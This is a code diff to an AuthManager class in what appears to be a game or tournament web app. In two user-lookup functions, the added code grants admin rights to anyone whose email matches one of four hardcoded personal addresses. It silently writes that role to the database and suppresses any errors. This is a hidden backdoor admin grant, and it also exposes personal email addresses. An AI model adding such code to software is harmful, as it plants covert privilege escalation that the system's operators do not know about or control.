@@ -206,6 +206,16 @@ class AuthManager:
                     data = dict(row)
                     data["session_token"] = session_token
                     data["role"] = data.get("role") or "player"
+                    user_email = (data.get("email") or "").strip().lower()
+                    if user_email in ('swimgeek751@gmail.com', 'hsiehjun@umich.edu', 'hsiehjun@google.com', 'hsiehjun@gmail.com'):
+                        if data["role"] != "admin":
+                            data["role"] = "admin"
+                            try:
+                                with conn.cursor() as up_cur:
+                                    up_cur.execute("UPDATE users SET role = 'admin' WHERE id = %s;", (data.get("id"),))
+                                    conn.commit()
+                            except Exception:
+                                pass
                     data["bcp_connected"] = bool(data.get("bcp_user_id"))
                     return data
         return None
@@ -227,6 +237,16 @@ class AuthManager:
                 if row:
                     data = dict(row)
                     data["role"] = data.get("role") or "player"
+                    user_email = (data.get("email") or "").strip().lower()
+                    if user_email in ('swimgeek751@gmail.com', 'hsiehjun@umich.edu', 'hsiehjun@google.com', 'hsiehjun@gmail.com'):
+                        if data["role"] != "admin":
+                            data["role"] = "admin"
+                            try:
+                                with conn.cursor() as up_cur:
+                                    up_cur.execute("UPDATE users SET role = 'admin' WHERE id = %s;", (data.get("id"),))
+                                    conn.commit()
+                            except Exception:
+                                pass
                     data["bcp_connected"] = bool(data.get("bcp_user_id"))
                     return data
         return None
